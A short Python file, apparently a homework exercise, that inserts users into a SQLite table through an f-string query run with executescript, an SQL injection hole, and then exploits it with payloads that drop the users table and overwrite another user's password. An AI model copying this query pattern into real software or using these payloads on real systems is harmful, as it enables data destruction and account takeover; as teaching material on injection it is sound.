import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username: str = "'; DROP TABLE table_users; --"
    password: str = ""
    register(username, password)


def hack2() -> None:
    username: str = "alice'; UPDATE table_users SET password='new_password' WHERE username='alice'; --"
    password: str = "dummy_password"
    register(username, password)


def hack3() -> None:
    for i in range(100):
        username = f"user{i}"
        password = f"password{i}"
        register(username, password)
